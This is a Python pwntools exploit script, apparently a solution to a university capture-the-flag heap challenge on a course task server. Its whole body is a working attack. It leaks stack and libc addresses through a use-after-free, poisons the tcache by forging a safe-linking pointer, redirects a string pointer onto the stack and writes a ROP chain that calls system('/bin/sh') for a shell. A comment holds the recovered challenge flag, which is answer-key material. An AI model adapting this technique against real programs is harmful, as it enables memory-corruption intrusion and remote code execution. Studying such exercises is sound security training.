from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
b *(main)
#b *change+341
b *change+387
#set pagination off
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33757)

#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/stringbins") /bin/sh -c \'gdb -x /gdbscript/gdbscript -p $(pgrep -n vuln)\'', shell=True)
#sleep(4)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


strings_n = -1

def alloc(size, content):
    #alloc seems to not end in 0 byte
    global strings_n
    strings_n += 1
    p.sendline(b"1")
    p.recvuntil(b"[*] How long is the string?\n")
    p.sendline(f"{size}".encode())
    p.recvuntil(b"characters to ")
    heap_addr = int(p.recvline()[2:-2], 16)
    print(f"str at: {hex(heap_addr)}")
    p.sendline(content)
    p.recvuntil(b"OK, I read ")
    p.recvline()
    return heap_addr


def dealloc(index):
    p.sendline(b"2")
    p.sendline(f"{index}".encode())


def change(index, size, content):
    p.sendline(b"5")
    p.recvuntil(b"[*] How many characters should I update?\n")
    p.sendline(f"{size}".encode())
    p.recvuntil(b"bytes to temporary ")
    stack_addr = int(p.recvline()[2:-2], 16)
    p.sendline(content)
    p.recvuntil(b"[*] What string index should I update?\n")
    p.sendline(f"{index}".encode())
    return stack_addr


def list(addr):
    # we can view deallocated entries?
    global strings_n
    p.sendline(b"3")
    p.recvuntil(b"[*] The following strings have been used:\n")
    for i in range(strings_n):
        print(p.recvline())


def print_(index):
    p.sendline(b"4")
    p.recvuntil(b"[*] What string index should I print?\n")
    p.sendline(f"{index}".encode())
    line = p.recvline()
    print(line)
    return line


def  PROTECT_PTR(pos, ptr):
    return (((pos) >> 12) ^ (ptr))

# find stack address:
# - alloc
# - change -> win
#
# find libc addr:
# - allocate big chunk
# - free it so it is in unsorted bins which has free libc leak using doubly-linked list pointers
# - view libc address by printing (UAF) huge freed chunk

alloc(20, cyclic(20))
stack_addr = change(strings_n, 20, b"A"*20)
stack_offset = 0x7ffcd10bde98-0x7ffcd10bde00
ret_addr = stack_addr + stack_offset
print("Return address located at: ", hex(ret_addr))

alloc(2000, cyclic(2000))
strings_n
dealloc(strings_n)

alloc(20, b"B"*20)
alloc(2000, b"B"*2000)

dealloc(strings_n)
dealloc(strings_n-1)

libc_offset = 0x7ff6aba7bcc0-0x7ff6ab8a9000
libc_addr = int(print_(strings_n)[7:-1][::-1].hex(), 16) - libc_offset

print("Libc: ", hex(libc_addr))

dealloc(strings_n-3)

alloc(0x10, cyclic(0x10))

protection_location = alloc(0x38, cyclic(0x38))
print("this one ^")
print("protection_location: ", hex(protection_location))
dealloc(strings_n)

change(strings_n, 0x8, p64(PROTECT_PTR(protection_location, protection_location+0x40-0x10)))

alloc(0x38, cyclic(0x38))
alloc(0x38, p64(ret_addr)*7)


libc = ELF("libc.so.6")
libc.address = libc_addr

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b'/bin/sh')))

payload = rop.chain()

change(1, len(payload), payload)

p.sendline(b"6") #exit to run rop chain

# alloc
# free
# change to make free list point onto strings_p
# alloc
# alloc -> now overwrite strings p with stack address
# change an entry that now points on the stack to write rop chain

# realloc does nothing if it doesn't have to - so we can make it not use our fake chunk in alloc() so our next alloc() actually does use it
# adding one more element in the free list and adding the fake chunk there would probably have prevented this realloc issue to begin with


print("Switching to interactive")
p.interactive()

#softsec{i9A0yWy5HODdyhhMcqq71cjAMhLbVAEI9Mh13wJNDUhkIEKb8DalZSRjvNYuKNtG}





#frame 6
# move into older frame to see error that happened

#list
# output source around context

#p *tcache within state where tcache was used:
#$3 = {
#  counts = {0, 0, 0, 0, 0, 1, 0 <repeats 58 times>},
#  entries = {0x0, 0x0, 0x0, 0x0, 0x0, 0x7fff6e707e68, 0x0 <repeats 58 times>}
#}
